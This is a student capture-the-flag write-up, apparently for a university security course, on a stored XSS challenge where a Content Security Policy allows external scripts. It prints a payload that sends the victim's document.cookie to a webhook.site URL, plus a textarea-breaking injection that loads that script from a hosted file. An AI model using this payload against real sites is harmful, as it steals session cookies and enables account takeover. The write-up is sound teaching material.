# Challenge `Read my lips: No more scripts!` Writeup

- Vulnerability:
    - XSS attack

- Where:
    - Blogpost creation content

- Impact:
    - Allows to steal remote user's cookie

## Steps to reproduce

This challenge is simmilar to the one before however by trying the exploits challenges we get this error: `Either the 'unsafe-inline' keyword, a hash, or a nonce is required to enable inline execution` which means that a CSP policy is set to prevent any inline scripts. However, it also includes `Content Security Policy directive: "script-src *"`which means that we can load external scripts.

Since we can load external scripts, we should create a javascript file and host it somewhere so that it can be loaded later. However, by coping the payload from the previous challenge and hosting it on a [pastebin](https://pastebin.com/), we get a `Cross-Origin Read Blocking (CORB)` warning meaning that the script must be hosted in the same origin as the server running. We can do this by using [Técnico's personal page](https://web.tecnico.ulisboa.pt). 

To do so, we should ssh to sigma (`ssh <istid>@sigma.tecnico.ulisboa.pt`) and create a script.js file under the /web directory. This file will contain the previous script: `location='https://webhook.site/<unique-id>/'+document.cookie`. Then, in the input area we should input `</textarea><script src="https://web.tecnico.ulisboa.pt/<istid>/script.js"></script>` and then click on the `Update post and send it for admin review` button and we will get the flag as before.
